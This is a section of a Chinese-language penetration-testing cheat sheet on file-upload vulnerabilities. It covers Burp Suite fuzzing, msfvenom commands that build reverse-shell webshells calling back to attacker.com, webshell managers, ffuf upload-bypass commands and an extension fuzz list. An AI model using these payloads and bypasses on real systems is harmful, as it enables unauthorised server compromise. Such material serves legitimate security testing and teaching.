## 七、工具使用

### 7.1 Burp Suite
- **Intruder**：批量Fuzz扩展名/MIME/文件名（Payload位置：filename值）
- **Repeater**：手动调整测试
- **Active Scan**：自动检测上传漏洞
- **Match and Replace**：自动修改Content-Type/filename
- **插件**：
  - Upload Scanner：自动化上传漏洞扫描
  - BurpMySmartBypass：WAF Bypass辅助
  - Content-Type Converter：自动修改MIME

### 7.2 专用工具
```bash
# WebShell生成（msfvenom）
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f war > shell.war

# 冰蝎/哥斯拉WebShell管理
# Godzilla：https://github.com/BeichenDream/Godzilla
# 冰蝎Behinder：https://github.com/rebeyond/Behinder
# 蚁剑AntSword：https://github.com/AntSwordProject/antSword

# 上传绕过工具
# upload_bypass：自动化多种绕过技术
python upload_bypass.py -u http://target.com/upload -f shell.php
# burp_upload_scanner：Burp上传扫描插件
# FUFF：批量Fuzz
ffuf -u http://target.com/upload -X POST -F "file=@shell.php;filename=FUZZ" -w extensions.txt -mc 200
```

### 7.3 快速Fuzz字典
**扩展名Fuzz列表：**
```
.php .php3 .php5 .phtml .pht .phar
.asp .aspx .asa .cer .cdx .ashx .asmx
.jsp .jspx .jspf .jsw
.cgi .pl .py .sh
```
结合大小写/双写/点空格/::$DATA等变体组合

